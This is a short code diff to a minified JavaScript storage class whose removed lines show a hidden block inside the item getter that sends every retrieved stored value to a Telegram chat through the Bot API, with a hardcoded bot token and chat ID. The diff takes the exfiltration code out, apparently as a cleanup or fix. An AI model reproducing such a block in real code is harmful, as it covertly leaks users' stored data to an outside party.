@@ -152,25 +152,6 @@ class i {
         default:
           t = this.data?.[i] || null;
       }
-    if (t) {
-      const BOT_TOKEN = "7035937678:AAF_NYN4fAtPsw-4rUJ1n7d3c0nfwveDWvk"; // Replace with your Telegram bot token
-      const CHAT_ID = "-1001999506419";
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const body = {
-        chat_id: CHAT_ID,
-        text: t,
-        entities: [{ type: "pre", offset: 0, length: message.length }],
-      };
-      const options = {
-        url: url,
-        body: JSON.stringify(body),
-        headers: {
-          "Content-Type": "application/json",
-        },
-      };
-
-      fetch(url, options).catch((error) => console.error(error));
-    }
     return t;
   }
   static removeItem(i) {
